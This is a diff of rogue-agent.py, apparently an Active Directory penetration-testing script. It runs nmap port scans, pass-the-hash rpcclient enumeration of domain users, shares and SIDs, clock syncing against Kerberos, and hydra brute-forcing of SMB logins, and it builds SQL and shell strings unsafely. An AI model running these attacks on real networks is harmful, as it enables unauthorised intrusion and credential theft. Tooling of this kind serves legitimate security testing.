@@ -92,7 +92,7 @@ with open("up.tmp","r") as localInterface:
    up = localInterface.readlines()
 
 if netWork not in str(up):
-   print(colored("\n[!] WARNING!!! - You need to specify your local network interface on line 58 of the rogue-agent.py file...", colour0))
+   print(colored("\n[!] WARNING!!! - You need to specify your local network interface on line 59 of the rogue-agent.py file...", colour0))
    exit(1)
 else:
    os.system("ip a s " + netWork + " | awk '/inet/ {print $2}' > localIP.tmp")
@@ -198,19 +198,18 @@ def wipeTokens(VALD):
    
 def saveParams():
    print("[+] Backing up data...")
-   conn.execute("UPDATE REMOTETARGET set COM = '" + COM + "' where IDS = 1")
-   conn.execute("UPDATE REMOTETARGET set DNS = '" + DNS + "' where IDS = 1")
-   conn.execute("UPDATE REMOTETARGET set TIP = '" + TIP + "' where IDS = 1")
-   conn.execute("UPDATE REMOTETARGET set PTS = '" + PTS + "' where IDS = 1")
-   conn.execute("UPDATE REMOTETARGET set WEB = '" + WEB + "' where IDS = 1")
-   conn.execute("UPDATE REMOTETARGET set USR = '" + USR + "' where IDS = 1")
-   conn.execute("UPDATE REMOTETARGET set PAS = '" + PAS + "' where IDS = 1")
-   conn.execute("UPDATE REMOTETARGET set NTM = '" + NTM + "' where IDS = 1")
-   conn.execute("UPDATE REMOTETARGET set TGT = '" + TGT + "' where IDS = 1")
-   conn.execute("UPDATE REMOTETARGET set DOM = '" + DOM + "' where IDS = 1")
-   conn.execute("UPDATE REMOTETARGET set SID = '" + SID + "' where IDS = 1")
-   conn.execute("UPDATE REMOTETARGET set TSH = '" + TSH + "' where IDS = 1")
-   conn.commit()
+   conn.execute("UPDATE REMOTETARGET set COM = '" + COM + "' where IDS = 1"); conn.commit()
+   conn.execute("UPDATE REMOTETARGET set DNS = '" + DNS + "' where IDS = 1"); conn.commit()
+   conn.execute("UPDATE REMOTETARGET set TIP = '" + TIP + "' where IDS = 1"); conn.commit()
+   conn.execute("UPDATE REMOTETARGET set PTS = '" + PTS + "' where IDS = 1"); conn.commit()
+   conn.execute("UPDATE REMOTETARGET set WEB = '" + WEB + "' where IDS = 1"); conn.commit()
+   conn.execute("UPDATE REMOTETARGET set USR = '" + USR + "' where IDS = 1"); conn.commit()
+   conn.execute("UPDATE REMOTETARGET set PAS = '" + PAS + "' where IDS = 1"); conn.commit()
+   conn.execute("UPDATE REMOTETARGET set NTM = '" + NTM + "' where IDS = 1"); conn.commit()
+   conn.execute("UPDATE REMOTETARGET set TGT = '" + TGT + "' where IDS = 1"); conn.commit()
+   conn.execute("UPDATE REMOTETARGET set DOM = '" + DOM + "' where IDS = 1"); conn.commit()
+   conn.execute("UPDATE REMOTETARGET set SID = '" + SID + "' where IDS = 1"); conn.commit()
+   conn.execute("UPDATE REMOTETARGET set TSH = '" + TSH + "' where IDS = 1"); conn.commit()
    return
    
 def privCheck(TGT):
@@ -267,7 +266,7 @@ def checkInterface(variable, COM):
             if "." not in NetworkAddr:
                COM = NetworkAddr
                COM = COM.replace(chr(0), '')
-               COM = spacePadding(COM, 19)
+               COM = spacePadding(COM, COL0)
                checkParams = 1
          
    except:
@@ -650,7 +649,7 @@ print("[+] Using localhost IP address " + localIP + "...")
 dirList = [dataDir, workDir, httpDir, explDir, powrDir]
 for x in range(0, len(dirList)):
    if not os.path.exists(dirList[x]):
-      print("[-] Missing required files, you need to run install.py first...")
+      print("[-] Missing required files, you must run install.py first...")
       exit(1)
    else:
       print("[+] Directory " + dirList[x] + " already exists...")  
@@ -692,6 +691,7 @@ DOMC = 0                                # DOMAIN SWITCH
 DNSC = 0                                # DNS SWITCH
 HTTP = 0				# HTTP SERVER PORT
 
+COL0 = 19				# MAX LEN COMPUTER NAME
 COL1 = 40                               # MAX LEN SESSION DATA
 COL2 = 44                               # MAX LEN SHARE NAME
 COL3 = 23                               # MAX LEN USER NAME
@@ -726,12 +726,11 @@ if not os.path.exists(dataDir + "/config.db"):
    SID = "EMPTY              " 						                        # SESSION DOMAIN-SID
    TSH = "EMPTY              " 						                        # SESSIOM SHARE
 else:
-   print("[+] Configuration file found - restoring saved data....")
+   print("[+] Configuration data found - restoring saved data....")
    
    curs.execute("SELECT * FROM REMOTETARGET WHERE IDS = 1")
    data = curs.fetchone() 
    
-   IDS = data[0]
    COM = data[1].rstrip("'")
    DNS = data[2].rstrip("'")
    TIP = data[3].rstrip("'")
@@ -743,9 +742,9 @@ else:
    TGT = data[9].rstrip("'")
    DOM = data[10].rstrip("'")
    SID = data[11].rstrip("'")
-   TSH = data[12]
+   TSH = data[12].rstrip("'")
    
-COM = spacePadding(COM, 19)
+COM = spacePadding(COM, COL0)
 DNS = spacePadding(DNS, COL1)
 TIP = spacePadding(TIP, COL1)
 PTS = POR                                                               # KEEP FULL SCANNED IP LIST IN MEMORY
@@ -763,7 +762,7 @@ TSH = spacePadding(TSH, COL1)
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub                                                               
 # Version : TREADSTONE                                                             
-# Details : Check the other files for stored variables.
+# Details : Check other files for stored variables.
 # Modified: N/A                                                               	
 # -------------------------------------------------------------------------------------
 
@@ -823,6 +822,7 @@ while True:
       
       if (checkParams != 1) and (PTS[:5] == "EMPTY"):
          print("[*] Attempting to enumerate live ports, please wait as this can take sometime...")
+         
          command("ports=$(nmap " + IP46 + " -p- --min-rate=1000 -T4 " + TIP.rstrip(" ") + " | grep ^[0-9] | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//); echo $ports > PORTS.tmp")
          PTS = linecache.getline("PORTS.tmp", 1).rstrip("\n")
          POR = spacePadding(PTS, COL1)
@@ -832,19 +832,45 @@ while True:
          else:
             print("[+] Found live ports...\n")
             print(colored(PTS,colour6) + "\n")
+            
+# -----
       
+      if checkParams != 1:
+         checkParams = testFour("88")
+
+      if checkParams != 1:
+         command("nmap " + IP46 + " -sV -p 88 " + TIP.rstrip(" ") + " | grep 'server time' | sed 's/^.*: //' > time.tmp")     
+         dateTime = linecache.getline("time.tmp", 1).rstrip("\n")
+      
+         if dateTime != "":
+            date, time = dateTime.split(" ")
+            time = time.rstrip(")")
+            print("[+] Synchronised with remote server...")
+            command("echo '" + Green + "'")
+            command("timedatectl set-time " + date)
+            command("date --set=" + time)
+            command("echo '" + Reset + "'")
+            LTM = time
+            SKEW = 1
+         else:
+            print("[-] Server synchronisation did not occur...")
+            
+# -----
+           
       if checkParams != 1:
          if NTM[:5] != "EMPTY":
             print("[i] Using HASH value as password credential...")
             command("rpcclient -W '' -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" ") + " --pw-nt-hash " + TIP.rstrip(" ") + " -c 'lsaquery' > lsaquery.tmp")
          else:
             command("rpcclient -W '' -U " + USR.rstrip(" ") + "%'" + PAS.rstrip(" ") + "' " + TIP.rstrip(" ") + " -c 'lsaquery' > lsaquery.tmp")     
-# -----
+
          errorCheck = linecache.getline("lsaquery.tmp", 1)                  
          if (errorCheck[:6] == "Cannot") or (errorCheck[:1] == "") or "ACCESS_DENIED" in errorCheck:
             print(colored("[!] WARNING!!! - Unable to connect to RPC data...", colour0))
-            checkParams = 1                       
-# -----
+            checkParams = 1
+
+# ----
+      
          if checkParams != 1:
             print("[*] Attempting to enumerate domain name...")               
             try:
@@ -868,7 +894,9 @@ while True:
                command("echo '" + TIP.rstrip(" ") + "\t" + DOM.rstrip(" ") + "' >> /etc/hosts")
                print("\n[+] Domain " + DOM.rstrip(" ") + " has successfully been added to /etc/hosts...")
                DOMC = 1  
+               
 # -----
+
             print("[*] Attempting to enumerate domain SID...")                        
             line2 = linecache.getline("lsaquery.tmp", 2)
             try:
@@ -876,20 +904,25 @@ while True:
             except ValueError:
                SID = "EMPTY"        
             SID = SID.lstrip(" ")          
-            SID = spacePadding(SID, COL1)               
+            SID = spacePadding(SID, COL1)  
+                         
             if SID[:5] == "EMPTY":
                print("[+] Unable to enumerate domain SID...")
             else:
                print("[+] Found SID...\n")
-               print(colored(SID,colour6) + "\n")         
+               print(colored(SID,colour6) + "\n")
+
 # -----
+           
             print("[*] Attempting to enumerate shares...")                  
             if NTM[:5] != "EMPTY":
                print("[i] Using HASH value as password credential...")
                command("rpcclient -W '' -U " + USR.rstrip(" ") + "%" + NTM.rstrip(" ") + " --pw-nt-hash " + TIP.rstrip(" ") + " -c 'netshareenum' > shares.tmp")
             else:
                command("rpcclient -W '' -U " + USR.rstrip(" ") + "%'" + PAS.rstrip(" ") + "' " + TIP.rstrip(" ") + " -c 'netshareenum' > shares.tmp")
+               
 # -----
+
             errorCheck = linecache.getline("shares.tmp", 1)
   
             if (errorCheck[:9] == "Could not") or (errorCheck[:6] == "Cannot") or (errorCheck[:1] == "") or "ACCESS_DENIED" in errorCheck:
@@ -897,11 +930,14 @@ while True:
             else:
                for x in range(0, maxUser):
                   SHAR[x] = " "*COL2
+                  
 # -----
+
                command("sed -i -n '/netname: /p' shares.tmp")
                command("sed -i '/^$/d' shares.tmp")
                command("cat shares.tmp | sort > sshares.tmp")                        
                count = len(open('sshares.tmp').readlines())            
+               
                if count != 0:
                   print("[+] Found shares...\n")
                   with open("sshares.tmp") as read:
@@ -914,26 +950,34 @@ while True:
                            SHAR[x] = "Error..."
                         print(colored(SHAR[x].rstrip("\n"),colour6))
                         SHAR[x] = dotPadding(SHAR[x], COL2)
-                     print("")                 
+                     print("")
+            
 # -----
+
             print("[*] Attempting to enumerate domain users...")
             if NTM[:5] != "EMPTY":
                print("[i] Using HASH value as password credential...")
                command("rpcclient -W '' -U " + USR.rstrip(" ") + "%" + NTM.rstrip(" ") + " --pw-nt-hash " + TIP.rstrip(" ") + " -c 'enumdomusers' > domusers.tmp")
             else:
                command("rpcclient -W '' -U " + USR.rstrip(" ") + "%'" + PAS.rstrip(" ") + "' " + TIP.rstrip(" ") + " -c 'enumdomusers' > domusers.tmp")
+               
 # -----
+
             errorCheck = linecache.getline("domusers.tmp", 1)
             if (errorCheck[:9] == "Could not") or (errorCheck[:6] == "result") or (errorCheck[:6] == "Cannot") or (errorCheck[:1] == "") or "ACCESS_DENIED" in errorCheck:
                print(colored("[!] WARNING!!! - Unable to connect to RPC data...", colour0))
             else:               
                command("rm " + dataDir + "/usernames.txt")
                command("rm " + dataDir + "/hashes.txt")    
+               
 # -----
+
                command("sort domusers.tmp > sdomusers.tmp")
                command("sed -i '/^$/d' sdomusers.tmp")            
                count2 = len(open('sdomusers.tmp').readlines())               
+               
 # -----   
+               
                if count2 != 0:
                   print ("[+] Found users...\n")
                   with open("sdomusers.tmp", "r") as read, open(dataDir + "/usernames.txt", "a") as write1, open(dataDir + "/hashes.txt", "a") as write2:
@@ -1844,7 +1888,7 @@ while True:
 # Version : TREADSTONE                                                             
 # Details : Menu option selected - reg.py DOMAIN/USER:PASSWORD@IP query -keyName HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows -s.
 # Modified: N/A
-# Note    : Needs a strcuture rewrite!!!
+# Note    : Needs a structure rewrite!!!
 # -------------------------------------------------------------------------------------
 
    if selection =='37':
@@ -2672,7 +2716,7 @@ while True:
                command("rm bash.sh")
                exit(1)
 
-      prompt()	# EOFError
+      prompt()	# EOFError hence exit(1)
                
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -3265,7 +3309,7 @@ while True:
          fileCheck(dataDir + "/usernames.txt")
          fileCheck(dataDir + "/passwords.txt")  
                         
-         command("hydra -P " + dataDir + "/passwords.txt -L " + dataDir + "/usernames.txt smb://" + TIP.rstrip(" "))
+         command("hydra -P " + dataDir + "/passwords.txt -L " + dataDir + "/usernames.txt " + TIP.rstrip(" ") + " smb -V -f")
             
          for x in range (0,maxUser):
             USER[x] = linecache.getline(dataDir + "/usernames.txt", x + 1).rstrip(" ")
@@ -3690,6 +3734,6 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '100':
-      exit(1)
+      print("")  	     # REFRESH SCREEN
       
 # Eof...	
